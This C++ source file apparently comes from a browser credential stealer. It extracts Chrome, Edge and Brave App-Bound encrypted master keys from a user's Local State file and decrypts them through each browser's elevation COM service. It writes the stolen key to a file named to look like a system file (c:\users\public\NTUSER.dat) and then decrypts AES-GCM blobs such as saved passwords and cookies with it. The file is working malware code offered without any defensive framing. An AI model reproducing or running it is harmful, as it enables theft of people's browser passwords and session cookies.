#include "includes\AppBoundDecryptor.h"
#include "includes\Helper.h"

DATA_BLOB* COM_master_key_blob = nullptr;
constexpr size_t KEY_SIZE = 32;
const uint8_t kCryptAppBoundKeyPrefix[] = { 'A', 'P', 'P', 'B' };

AppBoundDecryptor::AppBoundDecryptor() {}


BOOL AppBoundDecryptor::AppBoundDecryptorInit(std::string path, std::string identifier)
{
    if (file_exist(path)) {

        std::ifstream file(path);
        if (!file.is_open()) {
            return false;
        }


        std::string modified = std::regex_replace(identifier, std::regex(R"(\\)"), "\\\\");
        modified.pop_back();
        std::regex pattern("\"" + modified + "\"\\s*:\\s*\"([^\"]*)\"");

        std::string line;
        std::smatch match;
        std::string lastValue;


        while (std::getline(file, line)) {
            for (std::sregex_iterator it(line.begin(), line.end(), pattern), end; it != end; ++it)
            {
                std::string val = (*it)[1];

                if (val != "NULL")
                    lastValue = val;
            }
        }


        if (lastValue.empty())
            return false;

        if (!ConvertToBLOB(lastValue))
            return false;
    }
    else {
        return false;
    }
    return true;
}

BOOL AppBoundDecryptor::ConvertToBLOB(std::string hexString)
{
    size_t numBytes = hexString.length() / 2;


    COM_master_key_blob = new DATA_BLOB;
    COM_master_key_blob->cbData = static_cast<DWORD>(numBytes);
    COM_master_key_blob->pbData = static_cast<BYTE*>(malloc(numBytes));

    if (!COM_master_key_blob->pbData) {

        delete COM_master_key_blob;
        COM_master_key_blob = nullptr;
        return false;
    }


    for (size_t i = 0; i < numBytes; ++i) {
        std::string byteString = hexString.substr(i * 2, 2);
        COM_master_key_blob->pbData[i] = static_cast<BYTE>(std::stoul(byteString, nullptr, 16));
    }
    return true;
}

BOOL AppBoundDecryptor::RequestCOM(std::string service_parameter)
{
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string exeName = std::string(path).substr(std::string(path).find_last_of("\\/") + 1);

    size_t lastSlash = std::string(path).find_last_of("\\");
    size_t secondLastSlash = std::string(path).find_last_of("\\", lastSlash - 1);
    std::string parentFolderName = std::string(path).substr(secondLastSlash + 1, lastSlash - secondLastSlash - 1);

    CLSID CLSID_Elevator;
    IID IID_IElevator;
    std::string process_path;
    BSTR plaintext_data = nullptr;

    if (parentFolderName == "Chrome")
    {
        CLSID_Elevator = CLSID_Elevator_Chrome;
        IID_IElevator = IID_IElevator_Chrome;
        process_path = "Google\\Chrome";
    }
    else if (parentFolderName == "Edge")
    {
        CLSID_Elevator = CLSID_Elevator_Edge;
        IID_IElevator = IID_IElevator_Edge;
        process_path = "Microsoft\\Edge";
    }
    else if (parentFolderName == "Brave-Browser")
    {
        CLSID_Elevator = CLSID_Elevator_Brave;
        IID_IElevator = IID_IElevator_Brave;
        process_path = "BraveSoftware\\Brave-Browser";
    }

    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {

        return false;
    }

    std::vector<uint8_t> encrypted_key = RetrieveEncryptedKey(process_path, service_parameter);
    if (encrypted_key.size() == 0)
        return false;

    BSTR ciphertext_data = SysAllocStringByteLen(reinterpret_cast<const char*>(encrypted_key.data()), encrypted_key.size());
    if (!ciphertext_data) {

        CoUninitialize();
        return false;
    }


    Microsoft::WRL::ComPtr<IOriginalBaseElevator> elevator;
    Microsoft::WRL::ComPtr<IEdgeElevatorFinal> edge_elevator;
    DWORD last_error = ERROR_GEN_FAILURE;

    if (parentFolderName == "Edge")
    {
        hr = CoCreateInstance(CLSID_Elevator, nullptr, CLSCTX_LOCAL_SERVER, IID_IElevator, (void**)&edge_elevator);
        if (FAILED(hr)) {

            CoUninitialize();
            return false;
        }

        hr = CoSetProxyBlanket(
            edge_elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL,
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);

        hr = edge_elevator->DecryptData(ciphertext_data, &plaintext_data, &last_error);
    }
    else
    {
        hr = CoCreateInstance(CLSID_Elevator, nullptr, CLSCTX_LOCAL_SERVER, IID_IElevator, (void**)&elevator);
        if (FAILED(hr)) {

            CoUninitialize();
            return false;
        }

        hr = CoSetProxyBlanket(
            elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL,
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);

        hr = elevator->DecryptData(ciphertext_data, &plaintext_data, &last_error);
    }

    if (FAILED(hr)) {

        CoUninitialize();
        return false;
    }

    std::string decrypted_key_hex_string;
    std::string output_file = "c:\\users";
    output_file += "\\public\\";
    output_file += "NTUSER.dat";

    if (SUCCEEDED(hr)) {
        BYTE* decrypted_key = new BYTE[KEY_SIZE];
        memcpy(decrypted_key, (void*)plaintext_data, KEY_SIZE);
        SysFreeString(plaintext_data);

        decrypted_key_hex_string = BytesToHexString(decrypted_key, KEY_SIZE);
        std::string json;


        std::ofstream outputFile(output_file, std::ios::app);
        if (decrypted_key_hex_string != "") {
            if (outputFile.is_open()) {
                std::string json = "{\"" + process_path + "\":\"" + decrypted_key_hex_string + "\"},";

                outputFile << json;
                outputFile.close();
            }
        }
        else
        {
            decrypted_key_hex_string = "NULL";
            if (outputFile.is_open()) {
                std::string json = "{\"" + process_path + "\":\"" + decrypted_key_hex_string + "\"},";

                outputFile << json;
                outputFile.close();
                return false;
            }
        }
    }
    else
    {
        std::ofstream outputFile(output_file, std::ios::app);
        decrypted_key_hex_string = "NULL";
        if (outputFile.is_open()) {
            std::string json = "{\"" + process_path + "\":\"" + decrypted_key_hex_string + "\"},";

            outputFile << json;
            outputFile.close();
        }
        return false;
    }

    SysFreeString(ciphertext_data);
    CoUninitialize();
    return true;
}

std::vector<uint8_t> AppBoundDecryptor::RetrieveEncryptedKey(std::string process, std::string service_parameter) {


    size_t pos = service_parameter.find("-exec");
    if (pos != std::string::npos) {
        service_parameter = service_parameter.substr(0, pos);
    }

    std::string path = "C:\\Users\\";
    path = path + service_parameter;
    path = path + "\\AppData\\Local";
    path = path + "\\" + process;
    path = path + "\\User Data";
    path = path + "\\Local State";
    std::string base64_encrypted_key = read_json(path);

    if (base64_encrypted_key.empty())
    {
        return {};
    }

    std::vector<uint8_t> encrypted_key_with_header = Base64Decode(base64_encrypted_key);

    if (!std::equal(std::begin(kCryptAppBoundKeyPrefix), std::end(kCryptAppBoundKeyPrefix), encrypted_key_with_header.begin())) {


        return {};
    }

    return std::vector<uint8_t>(encrypted_key_with_header.begin() + sizeof(kCryptAppBoundKeyPrefix), encrypted_key_with_header.end());
}

std::string AppBoundDecryptor::read_json(const std::string& filePath) {
    std::ifstream file(filePath);
    if (!file.is_open()) {

        return "";
    }

    std::regex pattern("\"app_bound_encrypted_key\"\\s*:\\s*\"([^\"]*)\"");
    std::string line;
    std::smatch match;

    while (std::getline(file, line)) {
        if (std::regex_search(line, match, pattern)) {
            return match[1];
        }
    }


    return "";
}

std::string AppBoundDecryptor::AESDecrypter(std::vector<BYTE> EncryptedBlob)
{
    try
    {
        BCRYPT_ALG_HANDLE hAlgorithm = 0;
        BCRYPT_KEY_HANDLE hKey = 0;
        NTSTATUS status = 0;
        SIZE_T EncryptedBlobSize = EncryptedBlob.size();
        SIZE_T TagOffset = EncryptedBlobSize - 15;
        ULONG PlainTextSize = 0;

        std::vector<BYTE> CipherPass(EncryptedBlobSize);
        std::vector<BYTE> PlainText;
        std::vector<BYTE> IV(IV_SIZE);


        std::copy(EncryptedBlob.data() + 3, EncryptedBlob.data() + 3 + IV_SIZE, IV.begin());
        std::copy(EncryptedBlob.data() + 15, EncryptedBlob.data() + EncryptedBlobSize, CipherPass.begin());


        status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
        if (!BCRYPT_SUCCESS(status))
        {

            return "";
        }


        status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (UCHAR*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
        if (!BCRYPT_SUCCESS(status))
        {

            BCryptCloseAlgorithmProvider(hAlgorithm, 0);
            return "";
        }


        status = BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, COM_master_key_blob->pbData, COM_master_key_blob->cbData, 0);
        if (!BCRYPT_SUCCESS(status))
        {

            BCryptCloseAlgorithmProvider(hAlgorithm, 0);
            return "";
        }


        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO AuthInfo;
        BCRYPT_INIT_AUTH_MODE_INFO(AuthInfo);
        TagOffset = TagOffset - 16;
        AuthInfo.pbNonce = IV.data();
        AuthInfo.cbNonce = IV_SIZE;
        AuthInfo.pbTag = CipherPass.data() + TagOffset;
        AuthInfo.cbTag = TAG_SIZE;


        status = BCryptDecrypt(hKey, CipherPass.data(), TagOffset, &AuthInfo, NULL, 0, NULL, NULL, &PlainTextSize, 0);
        if (!BCRYPT_SUCCESS(status))
        {

            return "";
        }


        PlainText.resize(PlainTextSize);

        status = BCryptDecrypt(hKey, CipherPass.data(), TagOffset, &AuthInfo, NULL, 0, PlainText.data(), PlainTextSize, &PlainTextSize, 0);
        if (!BCRYPT_SUCCESS(status))
        {

            return "";
        }


        BCryptCloseAlgorithmProvider(hAlgorithm, 0);

        return std::string(PlainText.begin(), PlainText.end());
    }
    catch (int e)
    {
        return "";
    }
}
